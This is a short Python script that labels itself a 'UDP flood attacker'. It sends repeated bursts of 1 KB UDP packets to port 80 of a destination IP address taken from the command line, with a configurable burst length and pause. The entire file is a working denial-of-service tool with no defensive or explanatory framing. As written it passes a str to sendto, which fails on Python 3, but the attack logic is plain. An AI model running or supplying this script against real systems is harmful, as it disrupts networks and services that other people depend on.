#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
import os
import socket
import time
import argparse


def main():
    parser = argparse.ArgumentParser(description='UDP flood attacker.')
    parser.add_argument(
        '--period',
        help='Seconds between flood attack.',
        type=float,
        required=True)
    parser.add_argument(
        '--burst',
        help='Burst duration in seconds of each flood attack.',
        type=float,
        required=True)
    parser.add_argument(
        '--destination', help='Destination IP address.', required=True)
    args = parser.parse_args()

    data = '0' * 1024
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        start_time = time.time()
        while time.time() - start_time < args.burst:
            sock.sendto(data, (args.destination, 80))
        time.sleep(args.period)
    sock.close()


if __name__ == '__main__':
    main()
